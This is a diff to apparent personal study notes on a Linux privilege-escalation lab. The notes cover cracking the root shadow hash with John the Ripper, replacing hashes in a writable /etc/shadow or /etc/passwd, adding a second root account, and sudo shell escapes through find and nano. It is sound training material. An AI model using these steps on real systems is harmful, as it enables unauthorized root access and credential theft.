@@ -63,6 +63,8 @@ Exit MYSQL and run rootbash to open a shell that has root privileges.
 
 **/etc/shadow** usualyl contains user password hashes and is usually readable only by the root user.
 
+It is **word-writable file** meaning that any user can read,modified, and comprimised other user, Usually word-writable file is only allowed in the **var/tmp** directory since it is intended for storing temporarily files.
+
 After usign `cat /etc/shadow`.
 ![[Pasted image 20220726195804.png]]
 
@@ -73,4 +75,74 @@ Root's hash
 
 Saved root's hash into **hash1.txt**
 
+Uses tool john the ripper for finding weak passwords.
 
+`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
+
+![[Pasted image 20220727162452.png]]
+
+John uses a word lists of password called **rockyou.txt** then tries all hashing algorithm to match the hash file given **THM_root_hash.txt**.
+
+Discovered that the hashing algorithm is **sha512crypt** and the password in plain text is **password123**.
+
+---
+
+## Writable /etc/shadow
+Again usually readable by the root user.
+
+Since we got the root's password, now it is the time to change its password.
+
+`mkpasswd -m sha-512 newpasswordhere`, this creates a password with a hashing algorithm of sha-512.
+
+Result:
+**$6$mTXOoBKLCRhHse0a$APKGID9JaSmOuRLxLhoK0g4cHZidP1u0kjJFJ/7.ATKde8h.pcWYqzw5T5lBQGwb.EnzxmT6usXisFwPhB..c1**
+
+Now we can edit the **/etc/shadow** file and replace the current hash into our new hash.
+
+![[Pasted image 20220727164033.png]]
+
+---
+
+## Writeable /etc/passwd
+The **/etc/passwd** directory contains information about the user accounts and same as above usually **word-writable** by root only.
+
+`openssl passwd newpasswordhere`
+
+**Es3PFW5v0MFIc**
+
+Replace current root password to generated password.
+
+![[Pasted image 20220727165127.png]]
+
+Or we can create a new root account, we only need to copy the root's row then put it at the end of the file replacing only the first instance of root to **newroot**.
+![[Pasted image 20220727165333.png]]
+
+---
+
+## Sudo - Shell Escape Sequence
+We can see all the programs that the **Super Doer** allows us to run by using the 
+command `sudo -l`.
+
+![[Pasted image 20220727170031.png|center]]
+
+We can find programs that allows us to elevate privileges via an escape sequence here [gtfobins](https://gtfobins.github.io/).
+
+`sudo find . -exec /bin/sh \; -quit`
+![[Pasted image 20220727170659.png|center]]
+
+``` bash
+sudo nano | ^R^X |reset; sh 1>&0 2>&0
+```
+
+Got shell access.
+
+---
+
+## Sudo - Environment Variables
+
+```ad-info
+title: Environment Variables
+Is a name/value pair that is set outside of a program, that can be accessed by the program for configuration purposes.
+```
+
+**sudo** can be configured to inherit environment variables from the user's environment.
